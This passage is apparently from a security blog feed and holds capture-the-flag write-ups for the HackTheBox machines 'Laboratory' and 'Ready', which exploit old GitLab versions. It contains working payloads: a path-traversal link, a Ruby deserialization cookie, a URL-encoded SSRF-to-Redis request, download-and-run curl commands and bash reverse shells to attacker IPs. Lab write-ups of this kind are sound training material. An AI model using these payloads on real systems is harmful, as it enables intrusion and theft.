&lt;p&gt;&lt;img alt="ssl certificat" src="/media/2021.05/laboratory_01.png"&gt;&lt;/p&gt;
&lt;p&gt;Se we add another entry to our &lt;code&gt;/etc/hosts&lt;/code&gt; and browse to it.&lt;/p&gt;
&lt;h2 id="gitlab"&gt;gitlab&lt;/h2&gt;
&lt;p&gt;This is a standard gitlab installation. We create an account and using the
exploration function we found a public project that does not contains anything
useful.&lt;/p&gt;
&lt;p&gt;Looking at the help page we found that the version is &lt;code&gt;GitLab Community Edition 12.8.1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;While searching on Google we found a &lt;a href="https://hackerone.com/reports/827052"&gt;bug bounty report&lt;/a&gt;
for this specific version that disclosed a LFI and a RCE.&lt;/p&gt;
&lt;h3 id="lfi"&gt;LFI&lt;/h3&gt;
&lt;p&gt;In order to execute the code on the gitlab server we first need to use the LFI
to get &lt;code&gt;secrets.yml&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;So as described in the &lt;a href="https://hackerone.com/reports/827052"&gt;bug bounty report&lt;/a&gt;
we create two projects, one with an issue description containing the following
link and we move it to the second project.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;That allow us to get the file content.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# This file is managed by gitlab-ctl. Manual changes will be&lt;/span&gt;
&lt;span class="code-line"&gt;# erased! To change the contents below, edit /etc/gitlab/gitlab.rb&lt;/span&gt;
&lt;span class="code-line"&gt;# and run `sudo gitlab-ctl reconfigure`.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;---&lt;/span&gt;
&lt;span class="code-line"&gt;production:&lt;/span&gt;
&lt;span class="code-line"&gt;  db_key_base: 627773a77f567a5853a5c6652018f3f6e41d04aa53ed1e0df33c66b04ef0c38b88f402e0e73ba7676e93f1e54e425f74d59528fb35b170a1b9d5ce620bc11838&lt;/span&gt;
&lt;span class="code-line"&gt;  secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3&lt;/span&gt;
&lt;span class="code-line"&gt;  otp_key_base: db3432d6fa4c43e68bf7024f3c92fea4eeea1f6be1e6ebd6bb6e40e930f0933068810311dc9f0ec78196faa69e0aac01171d62f4e225d61e0b84263903fd06af&lt;/span&gt;
&lt;span class="code-line"&gt;  openid_connect_signing_key: |&lt;/span&gt;
&lt;span class="code-line"&gt;    -----BEGIN RSA PRIVATE KEY-----&lt;/span&gt;
&lt;span class="code-line"&gt;    MIIJKQIBAAKCAgEA5LQnENotwu/SUAshZ9vacrnVeYXrYPJoxkaRc2Q3JpbRcZTu&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We need a gitlabshell to create the cookie that will allow use to execute the
code on the box. We also need the same version as the one on the box.&lt;/p&gt;
&lt;p&gt;Using docker and some &lt;a href="[https://www.howtoforge.com/how-to-install-gitlab-with-docker-on-ubuntu-2004"&gt;article&lt;/a&gt;
we create a &lt;code&gt;docker-compose.yml&lt;/code&gt; that looks as follow.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;web:&lt;/span&gt;
&lt;span class="code-line"&gt;  image: &amp;#39;gitlab/gitlab-ce:12.8.1-ce.0&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;  restart: always&lt;/span&gt;
&lt;span class="code-line"&gt;  hostname: &amp;#39;gitlab.hakase-labs.io&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  environment:&lt;/span&gt;
&lt;span class="code-line"&gt;    GITLAB_OMNIBUS_CONFIG: |&lt;/span&gt;
&lt;span class="code-line"&gt;      # Add any other gitlab.rb configuration here, each on its own line&lt;/span&gt;
&lt;span class="code-line"&gt;      #external_url &amp;#39;https://gitlab.hakase-labs.io&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;      gitlab_rails[&amp;#39;gitlab_shell_ssh_port&amp;#39;] = 2224&lt;/span&gt;
&lt;span class="code-line"&gt;      #nginx[&amp;#39;redirect_http_to_https&amp;#39;] = true&lt;/span&gt;
&lt;span class="code-line"&gt;      #nginx[&amp;#39;ssl_certificate&amp;#39;] = &amp;quot;/etc/gitlab/ssl/fullchain.pem&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;      #nginx[&amp;#39;ssl_certificate_key&amp;#39;] = &amp;quot;/etc/gitlab/ssl/privkey.pem&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;      #nginx[&amp;#39;ssl_dhparam&amp;#39;] = &amp;quot;/etc/gitlab/ssl/dhparams.pem&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  ports:&lt;/span&gt;
&lt;span class="code-line"&gt;    - &amp;#39;80:80&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;    - &amp;#39;443:443&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;    - &amp;#39;2224:22&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  volumes:&lt;/span&gt;
&lt;span class="code-line"&gt;    - &amp;#39;${GITLAB_HOME}/config:/etc/gitlab&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;    - &amp;#39;${GITLAB_HOME}/logs:/var/log/gitlab&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;    - &amp;#39;${GITLAB_HOME}/data:/var/opt/gitlab&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;    - &amp;#39;${GITLAB_HOME}/config/ssl:/etc/gitlab/ssl&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id="rce"&gt;RCE&lt;/h3&gt;
&lt;p&gt;We got a shell on out gitlab docker and overwrite
&lt;code&gt;/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml&lt;/code&gt; with the downloaded one.
Then we use &lt;code&gt;gitlab-rails console&lt;/code&gt; to reproduce the lines in the
&lt;a href="https://hackerone.com/reports/827052"&gt;hackerone report&lt;/a&gt;
to create a Marshalled payload within a cookie. Our first payload is a simple
&lt;code&gt;wget&lt;/code&gt; targeting our own python server.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;request = ActionDispatch::Request.new(Rails.application.env_config)&lt;/span&gt;
&lt;span class="code-line"&gt;request.env[&amp;quot;action_dispatch.cookies_serializer&amp;quot;] = :marshal&lt;/span&gt;
&lt;span class="code-line"&gt;cookies = request.cookie_jar&lt;/span&gt;
&lt;span class="code-line"&gt;irb(main):014:0&amp;gt; erb = ERB.new(&amp;quot;&amp;lt;%= `wget http://10.10.14.51:8000/p0wn` %&amp;gt;&amp;quot;)&lt;/span&gt;
&lt;span class="code-line"&gt;depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, &amp;quot;@result&amp;quot;, ActiveSupport::Deprecation.new)&lt;/span&gt;
&lt;span class="code-line"&gt;cookies.signed[:cookie] = depr&lt;/span&gt;
&lt;span class="code-line"&gt;puts cookies[:cookie]&lt;/span&gt;
&lt;span class="code-line"&gt;BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiYyNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGB3Z2V0IGh0dHA6Ly8xMC4xMC4xNC41MTo4MDAwL3Awd25gICkudG9fcyk7IF9lcmJvdXQGOgZFRjoOQGVuY29kaW5nSXU6DUVuY29kaW5nClVURi04BjsKRjoTQGZyb3plbl9zdHJpbmcwOg5AZmlsZW5hbWUwOgxAbGluZW5vaQA6DEBtZXRob2Q6C3Jlc3VsdDoJQHZhckkiDEByZXN1bHQGOwpUOhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpU--e58cf8e3ef8e1b016de9b83cac7627d48ec17c45&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We then use &lt;code&gt;curl&lt;/code&gt; to send our request and got a hit on our web server.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;curl -vvv -k &amp;#39;https://git.laboratory.htb/users/sign_in&amp;#39; -b &amp;quot;experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiYyNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGB3Z2V0IGh0dHA6Ly8xMC4xMC4xNC41MTo4MDAwL3Awd25gICkudG9fcyk7IF9lcmJvdXQGOgZFRjoOQGVuY29kaW5nSXU6DUVuY29kaW5nClVURi04BjsKRjoTQGZyb3plbl9zdHJpbmcwOg5AZmlsZW5hbWUwOgxAbGluZW5vaQA6DEBtZXRob2Q6C3Jlc3VsdDoJQHZhckkiDEByZXN1bHQGOwpUOhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpU--e58cf8e3ef8e1b016de9b83cac7627d48ec17c45&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We then change our payload to download a "reverse shell" and execute it:
&lt;code&gt;curl http://10.10.14.51:8000/rev.sh -o /tmp/rev.sh &amp;amp;&amp;amp; chmod 777 rev.sh &amp;amp;&amp;amp; bash /tmp/rev.sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The content of rev.sh is the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/bin/bash&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;bash -i &amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt; /dev/tcp/10.10.14.51/4242 &lt;span class="m"&gt;0&lt;/span&gt;&amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Our &lt;code&gt;netcat&lt;/code&gt; listener quickly catch a reverse shell as git.&lt;/p&gt;
&lt;h2 id="getting-user"&gt;Getting user&lt;/h2&gt;
&lt;p&gt;Using gitlab-rails console on the HTB machine and gitlab documentation about
&lt;a href="https://docs.gitlab.com/ee/administration/troubleshooting/gitlab_rails_cheat_sheet.html"&gt;gitlab-rails cheatsheet&lt;/a&gt;
and &lt;a href="https://docs.gitlab.com/ee/development/permissions.html"&gt;projects' permissions&lt;/a&gt;
we change the visibility of every projects on the gitlab instance to public.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;gitlab-rails console&lt;/span&gt;
&lt;span class="code-line"&gt;--------------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;GitLab:       12.8.1 (d18b43a5f5a) FOSS&lt;/span&gt;
&lt;span class="code-line"&gt;GitLab Shell: 11.0.0&lt;/span&gt;
&lt;span class="code-line"&gt;PostgreSQL:   10.12&lt;/span&gt;
&lt;span class="code-line"&gt;--------------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Loading production environment (Rails 6.0.2)&lt;/span&gt;
&lt;span class="code-line"&gt;Switch to inspect mode.&lt;/span&gt;
&lt;span class="code-line"&gt;Project.update_all(visibility_level: 20)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;That allow us to discover a &lt;code&gt;securedocker&lt;/code&gt; project from the &lt;code&gt;dexter&lt;/code&gt; user
containing a &lt;a href="https://git.laboratory.htb/dexter/securedocker/-/blob/master/dexter/.ssh/id_rsa"&gt;SSH private key&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Using this key we can connect as &lt;code&gt;dexter&lt;/code&gt; on the box and get the user flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ ssh 10.129.60.56 -i id_rsa -ldexter&lt;/span&gt;
&lt;span class="code-line"&gt;dexter@laboratory:~$ id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=1000(dexter) gid=1000(dexter) groups=1000(dexter)&lt;/span&gt;
&lt;span class="code-line"&gt;dexter@laboratory:~$ cat user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;a153ecab9310723fa79e5dc37487ef68&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;Root&lt;/h1&gt;
&lt;p&gt;We start enumerating the box. We "quickly" found a suspect SUID binary
&lt;code&gt;docker-security&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;dexter@laboratory:/tmp/.plop$ find / -perm -4000 -type f -exec ls -la {} 2&amp;gt;/dev/null \; | grep -v snap&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root dexter 16720 Aug 28 14:52 /usr/local/bin/docker-security&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 166056 Jul 15 00:17 /usr/bin/sudo&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 44784 May 28  2020 /usr/bin/newgrp&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 67816 Apr  2  2020 /usr/bin/su&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 88464 May 28  2020 /usr/bin/gpasswd&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 39144 Mar  7  2020 /usr/bin/fusermount&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 85064 May 28  2020 /usr/bin/chfn&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 31032 Aug 16  2019 /usr/bin/pkexec&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-sr-x 1 daemon daemon 55560 Nov 12  2018 /usr/bin/at&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 39144 Apr  2  2020 /usr/bin/umount&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 53040 May 28  2020 /usr/bin/chsh&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 55528 Apr  2  2020 /usr/bin/mount&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 68208 May 28  2020 /usr/bin/passwd&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-- 1 root messagebus 51344 Jun 11 18:22 /usr/lib/dbus-1.0/dbus-daemon-launch-helper&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 22840 Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1&lt;/span&gt;
&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 473576 May 29  2020 /usr/lib/openssh/ssh-keysign&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We use &lt;code&gt;ltrace&lt;/code&gt; to see what binaries are called by the SUID one. We identify
that the binary use a relative path call to &lt;code&gt;chmod&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;dexter@laboratory:~$ ltrace docker-security&lt;/span&gt;
&lt;span class="code-line"&gt;setuid(0)                                                                                                                                        = -1&lt;/span&gt;
&lt;span class="code-line"&gt;setgid(0)                                                                                                                                        = -1&lt;/span&gt;
&lt;span class="code-line"&gt;system(&amp;quot;chmod 700 /usr/bin/docker&amp;quot;chmod: changing permissions of &amp;#39;/usr/bin/docker&amp;#39;: Operation not permitted&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;no return ...&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;--- SIGCHLD (Child exited) ---&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;... system resumed&amp;gt; )                                                                                                                           = 256&lt;/span&gt;
&lt;span class="code-line"&gt;system(&amp;quot;chmod 660 /var/run/docker.sock&amp;quot;chmod: changing permissions of &amp;#39;/var/run/docker.sock&amp;#39;: Operation not permitted&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;no return ...&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;--- SIGCHLD (Child exited) ---&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;... system resumed&amp;gt; )                                                                                                                           = 256&lt;/span&gt;
&lt;span class="code-line"&gt;+++ exited (status 0) +++&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;So we simply create a new "&lt;code&gt;chmod&lt;/code&gt;" program and add it to our path to get a root
shell and grab the flag&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;dexter@laboratory:/tmp/.plop$ echo /bin/bash &amp;gt; chmod&lt;/span&gt;
&lt;span class="code-line"&gt;dexter@laboratory:/tmp/.plop$ chmod +x chmod&lt;/span&gt;
&lt;span class="code-line"&gt;dexter@laboratory:/tmp/.plop$ export PATH=./:$PATH&lt;/span&gt;
&lt;span class="code-line"&gt;dexter@laboratory:/tmp/.plop$ echo $PATH&lt;/span&gt;
&lt;span class="code-line"&gt;./:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin&lt;/span&gt;
&lt;span class="code-line"&gt;dexter@laboratory:/tmp/.plop$ docker-security&lt;/span&gt;
&lt;span class="code-line"&gt;root@laboratory:/tmp/.plop# cat /root/root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;1b08ba51a612057b8aca9940e57fce77&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;A really interesting box that allow us to play with a real vulnerability from a
bug bounty report. Maybe more a medium than an easy box.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="linux"></category><category term="gitlab"></category></entry><entry><title>HTB: Ready</title><link href="https://maggick.fr/2021/05/htb-ready.html" rel="alternate"></link><published>2021-05-16T09:20:00+02:00</published><updated>2021-05-16T09:20:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-05-16:/2021/05/htb-ready.html</id><summary type="html">&lt;p&gt;&lt;img alt="Ready card" class="align-left" src="/media/2021.05/ready_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/304"&gt;Ready&lt;/a&gt; published on
December 12 2020 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/27897"&gt;bertolis&lt;/a&gt;
This box is classified as a medium machine. This box implies an outdated gitlab
server, a clear text password in a backup file and a docker container.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2021.05/ready_card.png" alt="Ready card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/304"&gt;Ready&lt;/a&gt; published on
December 12 2020 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/27897"&gt;bertolis&lt;/a&gt;
This box is classified as a medium machine. This box implies an outdated gitlab
server, a clear text password in a backup file and a docker container.&lt;/p&gt;


&lt;h1 id="user"&gt;User&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;We start with an nmap scan. Only port 22 (SSH) and port 5080 (HTTP) are open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.91 scan initiated Sun Dec 13 03:40:16 2020 as: nmap -p- -sSV -oN nmap 10.129.29.192&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.129.29.192&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.014s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65533 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT     STATE SERVICE VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;5080/tcp open  http    nginx&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Sun Dec 13 03:40:48 2020 -- 1 IP address (1 host up) scanned in 31.28 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;The HTTP service is once again a gitlab (my latest rooted box is
&lt;a href="/2021/05/htb-laboratory.html"&gt;laboratory&lt;/a&gt;) server. This time the version is 11.4.7. A Google
research "gitlab 11.4.7 exploit" lead us to a
&lt;a href="https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/"&gt;blog article about an RCE on gitlab during a CTF&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Following the blog exploitation we end up with a request looking like the
following and can validate the RCE using a python server on our kalibox.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;POST /projects HTTP/1.1&lt;/span&gt;
&lt;span class="code-line"&gt;Host: 10.129.29.192:5080&lt;/span&gt;
&lt;span class="code-line"&gt;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&lt;/span&gt;
&lt;span class="code-line"&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&lt;/span&gt;
&lt;span class="code-line"&gt;Accept-Language: en-US,en;q=0.5&lt;/span&gt;
&lt;span class="code-line"&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;
&lt;span class="code-line"&gt;Referer: http://10.129.29.192:5080/projects/new&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Type: application/x-www-form-urlencoded&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Length: 1073&lt;/span&gt;
&lt;span class="code-line"&gt;Origin: http://10.129.29.192:5080&lt;/span&gt;
&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
&lt;span class="code-line"&gt;Cookie: _gitlab_session=140270c33fe803d8ab11d0f9a85c45cf; sidebar_collapsed=false&lt;/span&gt;
&lt;span class="code-line"&gt;Upgrade-Insecure-Requests: 1&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;utf8=%E2%9C%93&amp;amp;authenticity_token=%2BEHyUYosjkfZlzfMEpR8QFZ%2BWiJMAQQ%2BTiB3Wt%2FNK0fNBNX9EhAKd6VM6okCvVQ0fZ6HxSBzQdo%2Fx4Lfe4nDCw%3D%3D&amp;amp;project%5Bimport_url%5D=git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7C%63%75%72%6c%20%68%74%74%70%3a%2f%2f%31%30%2e%31%30%2e%31%34%2e%31%38%3a%38%30%30%30%2f%72%65%76%32%2e%73%68%20%7c%20%62%61%73%68%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf.git&amp;amp;project%5Bci_cd_only%5D=false&amp;amp;project%5Bname%5D=&amp;amp;project%5Bnamespace_id%5D=6&amp;amp;project%5Bpath%5D=ttreqqq139&amp;amp;project%5Bdescription%5D=&amp;amp;project%5Bvisibility_level%5D=0&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can even just manually import a git project using the following "git url":
&lt;code&gt;git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Cxxxxxxxxx%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf.git&lt;/code&gt; and replacing the payload &lt;code&gt;xxxxxxxxxxx&lt;/code&gt; with our own URL encoded.&lt;/p&gt;
&lt;p&gt;We send the following payload &lt;code&gt;curl http://10.10.14.18:8000/rev2.sh | bash&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The content of rev2.sh is the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/bin/bash&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;bash -i &amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt; /dev/tcp/10.10.14.18/4443 &lt;span class="m"&gt;0&lt;/span&gt;&amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We run a netcat listener to catch our reverse shell. We end up with a shell as
&lt;code&gt;git&lt;/code&gt; that can read the user flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ nc -l -p 4443&lt;/span&gt;
&lt;span class="code-line"&gt;bash: cannot set terminal process group (485): Inappropriate ioctl for device&lt;/span&gt;
&lt;span class="code-line"&gt;bash: no job control in this shell&lt;/span&gt;
&lt;span class="code-line"&gt;git@gitlab:~/gitlab-rails/working$ id&lt;/span&gt;
&lt;span class="code-line"&gt;id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=998(git) gid=998(git) groups=998(git)&lt;/span&gt;
